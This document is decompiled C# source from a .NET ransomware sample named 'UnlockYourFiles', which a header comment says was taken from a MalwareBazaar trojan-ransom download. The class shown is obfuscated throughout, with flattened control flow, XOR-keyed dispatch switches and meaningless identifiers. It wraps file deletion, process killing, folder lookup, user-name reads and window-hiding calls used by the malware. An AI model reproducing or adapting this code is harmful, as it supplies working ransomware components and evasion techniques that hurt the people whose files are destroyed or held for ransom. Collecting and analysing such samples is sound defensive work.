// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴗ
// Assembly: UnlockYourFiles, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79C9ABD9-AD70-4EA1-ADC4-FC1CC25178CB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Crypmodng.gen-802f1f5823881d1717771e104eefc27d07f7b92bebc533aa0b33fb1233ca3d4d.exe

using System;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;
using UnlockYourFiles.Properties;

namespace Ⴈ
{
  internal sealed class Ⴗ
  {
    internal static long Ⴐ;

    [SecuritySafeCritical]
    static Ⴗ() => Resources.ႣႤ();

    [SecuritySafeCritical]
    internal static SettingsBase Ⴅ([In] SettingsBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 39:
          num1 = 4;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 5;
            continue;
          case 1:
          case 4:
          case 7:
            goto label_8;
          case 2:
          case 6:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴅ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return SettingsBase.Synchronized(obj0);
    }

    [SecuritySafeCritical]
    internal static string Ⴄ([In] Environment.SpecialFolder obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 90:
          num1 = 7;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_8;
          case 2:
            num2 = 6;
            continue;
          case 5:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴄ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return Environment.GetFolderPath(obj0);
    }

    [SecuritySafeCritical]
    internal static string Ⴗ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 39:
          num1 = 6;
          break;
        case 40:
          num1 = 8;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 6:
            goto label_9;
          case 3:
          case 5:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 7:
            num2 = 4;
            continue;
          case 8:
            goto label_10;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴗ);
            num2 = 4;
            continue;
        }
      }
label_9:
      return obj0 + obj1;
label_10:
      return Path.Combine(obj0, obj1);
    }

    [SecuritySafeCritical]
    internal static void Ⴃ([In] Control obj0, [In] Point obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_7;
          case 5:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 118:
                num2 = 1;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Location = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴈ([In] PictureBox obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
            num1 = 4;
            continue;
          case 2:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 116:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.TabIndex = obj1;
    }

    [SecuritySafeCritical]
    internal static FlatButtonAppearance Ⴀ([In] ButtonBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 64:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 6:
            goto label_8;
          case 1:
            num2 = 7;
            continue;
          case 3:
            num2 = 7;
            continue;
          case 5:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴀ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.FlatAppearance;
    }

    [SecuritySafeCritical]
    internal static void Ⴓ([In] TextBoxBase obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_7;
          case 1:
          case 5:
            num1 = 2;
            continue;
          case 3:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 56:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Multiline = obj1;
    }

    [SecuritySafeCritical]
    internal static string Ⴍ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 36:
          num1 = 5;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            num2 = 6;
            continue;
          case 1:
          case 5:
            goto label_8;
          case 2:
          case 3:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴍ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return Environment.UserName;
    }

    [SecuritySafeCritical]
    internal static void Ⴜ([In] Form obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 3:
            num1 = 0;
            continue;
          case 2:
          case 5:
            goto label_7;
          case 4:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 125:
                num2 = 2;
                break;
              case 126:
                goto label_8;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_9:
      return;
label_7:
      obj0.TopMost = obj1;
      return;
label_8:
      obj0.ShowInTaskbar = obj1;
    }

    [SecuritySafeCritical]
    internal static Control.ControlCollection ႤႥ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 39:
          num1 = 5;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            num2 = 0;
            continue;
          case 3:
          case 7:
            num2 = 0;
            continue;
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႥ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.Controls;
    }

    [SecuritySafeCritical]
    internal static void ႤႤ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 4;
            continue;
          case 3:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 115:
                num2 = 3;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      File.Delete(obj0);
    }

    [SecuritySafeCritical]
    internal static void ႤႷ([In] Process obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            num1 = 1;
            continue;
          case 2:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 118:
                num2 = 4;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Kill();
    }

    [SecuritySafeCritical]
    internal static int ႤႣ([In] Random obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 5:
          num1 = 4;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
            num2 = 5;
            continue;
          case 2:
          case 5:
            goto label_3;
          case 4:
          case 6:
            goto label_8;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႣ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.Next(obj1);
    }

    [SecuritySafeCritical]
    internal static FileAttributes ႤႰ([In] FileSystemInfo obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 84:
          num1 = 1;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
          case 7:
            num2 = 2;
            continue;
          case 1:
            goto label_8;
          case 2:
          case 6:
            goto label_3;
          case 4:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႰ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.Attributes;
    }

    [SecuritySafeCritical]
    internal static Process ႤႨ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 35:
          num1 = 3;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 7:
            num2 = 0;
            continue;
          case 2:
          case 6:
            num2 = 0;
            continue;
          case 3:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႨ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Process.GetCurrentProcess();
    }

    [SecuritySafeCritical]
    internal static string ႤႠ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 118)
      {
        case 0:
          return obj0 + obj1;
        default:
          goto label_0;
      }
    }

    [SecuritySafeCritical]
    internal static int ႤႳ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 66)
      {
        case 0:
          return obj0.Read(obj1, obj2, obj3);
        default:
          goto label_0;
      }
    }
  }
}
